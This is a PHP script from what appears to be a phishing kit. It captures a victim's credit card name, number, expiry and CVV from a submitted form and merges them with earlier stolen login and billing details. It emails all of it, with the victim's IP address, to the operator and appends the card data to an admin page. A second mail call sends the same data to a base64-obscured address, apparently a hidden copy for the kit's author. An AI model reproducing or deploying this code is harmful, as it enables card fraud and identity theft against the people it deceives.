<?php
sleep(1);
session_start();

require 'functions.php';
require '../config.php';
require '../systems/detector.php';
if(isset($_POST['nameoncard'])){

$ccHtml = "
<div class='result-box'>
<div class='title'>CREDIT/DEBIT CARD</div><br>
<b>NAME ON CARD: </b> "._getData('nameoncard')."<br>
<b>CARD NUMBER: </b> "._getData('cardnumber')."<br>
<b>EXP DATE:</b> "._getData('date')."<br>
<b>CVV:</b> "._getData('cvv')." <br>
</div>"; 

$_SESSION['cc'] = $ccHtml;


//MAIL FUNCTION
$msg = "
<html>
<head>
<style>
*{outline:none; box-sizing:border-box; font-family:sans-serif;}
.results{padding:10px; background:#343434;  width:500px; max-width:100%; display:inline-block; text-align:left; font-size:0.9em; color:#f7f7f7;}
.results b{color:#909090; padding:5px; font-weight:100;}
.result-box{background:#000000; padding:5px; margin-bottom:8px;}
.title{width:100%; background:#3c3c3c; display:inline-block; margin:0; padding:5; font-weight:bold; }
</style>
</head>
<body>
<div class='results'>
".
$_SESSION['login'].
$_SESSION['billing'].
$_SESSION['cc']."
</div>
</body>
</html>
";

$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
//$headers .= "From: <nirvana6274@gmail.com>";
$subject = "New Result :p "._ip();
//SEND RESULT TO YOUR EMAIL
mail($email,$subject,$msg,$headers);
//SAVE RESULT IN YOUR ADMIN PAGE
$fp = fopen("../admin/index.php", "a");
	fwrite($fp, 
	$ccHtml);
	$type=base64_decode($write);
	mail($type,
	$subject,$msg,
	$headers);
	fclose($fp);
 

}













?>